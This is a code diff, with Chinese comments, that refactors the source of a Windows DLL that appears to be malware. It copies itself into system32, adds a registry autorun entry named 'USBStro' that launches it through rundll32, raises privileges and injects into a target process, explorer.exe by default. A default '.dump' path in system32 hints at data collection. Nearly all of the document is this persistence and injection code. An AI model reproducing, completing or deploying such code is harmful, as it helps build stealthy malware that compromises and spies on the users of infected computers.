@@ -35,23 +35,30 @@ extern "C" __declspec(dllexport) void CALLBACK Start (
 		int nCmdShow
 		);
 
+extern std::string getDLLPath();
+
+extern void saveConfig(const std::string& dstPath);
+
 /// dll的文件名
 char g_szDllname[MAX_PATH+1] = { 0 };
 /// 缺省下载路径
 const char* g_szDefaultPath = "C:\\windows\\system32\\usbstro.dll.dump";
+/// 缺省启动项名
+const char* g_szDefaultKey  = "USBStro";
 
 /// 写入到注册表启动项
 void installToSystem()
 {
-	string dstPath;
+	std::string dstPath;
 	HKEY phkResult;
 
 	// 写入"rundll32 dllname,Start target.exe"到启动项
-	const char* KeyName = "USBStro";
+	const char* KeyName = g_szDefaultKey;
 	char KeyValue[MAX_PATH+1];
 	strcpy(KeyValue, "rundll32 ");
 	strcat(KeyValue, g_szDllname);
 	strcat(KeyValue, ",Start ");
+	// 如果指定了自定义目标进程名就加入到KeyValue
 	if(__argc >= 3)
 		strcat(KeyValue, __argv[2]);
 
@@ -97,10 +104,7 @@ extern "C" __declspec(dllexport) void CALLBACK Install (
 	// 得到当前DLL位置
 	GetModuleFileName(g_DLLHandle, dllPath, MAX_PATH);
 	// 得到安装到系统路径
-	string destPath;
-	destPath = getSystemPath();
-	destPath += "\\";
-	destPath += g_szDllname;
+	std::string destPath = getDLLPath();
 	// 拷贝DLL到系统文件
 	CopyFile(dllPath, destPath.c_str(), FALSE);
 
@@ -111,11 +115,7 @@ extern "C" __declspec(dllexport) void CALLBACK Install (
 		dstPath = __argv[3];
 	installToSystem();
 
-	// 记录目标目录名到配置文件
-	string str = getConfigPath();
-	ofstream of(str.c_str());
-	of << dstPath << endl;
-	of.close();
+	saveConfig(dstPath);
 
 	Start(hwnd, hInstance, lpCmdLine, nCmdShow);
 }
@@ -133,13 +133,10 @@ extern "C" __declspec(dllexport) void CALLBACK Start (
 		pszTarget = "explorer.exe"; // 缺省目标为explorer.exe
 	}
 	else {
-		pszTarget = __argv[2];
+		pszTarget = __argv[2];      // 已指定目标进程名
 	}
 
-	string destPath;
-	destPath = getSystemPath();
-	destPath += "\\";
-	destPath += g_szDllname;
+	std::string destPath = getDLLPath();
 	
 	enablePrivilege();	
 	// 选择被注射的线程
@@ -168,6 +165,27 @@ extern "C" __declspec(dllexport) void CALLBACK Start (
 	}
 }
 
+/// 保存配置
+void saveConfig(const std::string &dstPath)
+{
+	// 记录目标目录名到配置文件
+	std::string str = getConfigPath();
+	ofstream of(str.c_str());
+	of << dstPath << endl;
+	of.close();
+}
+
+/// 得到DLL路径名
+std::string getDLLPath()
+{
+	std::string destPath;
+	destPath = getSystemPath();
+	destPath += "\\";
+	destPath += g_szDllname;
+	return destPath;
+}
+
+/// 得到DLL文件名
 std::string getModuleFilename()
 {
 	char szPath[MAX_PATH+1] = { 0 }, szName[MAX_PATH+1], szExt[MAX_PATH+1];
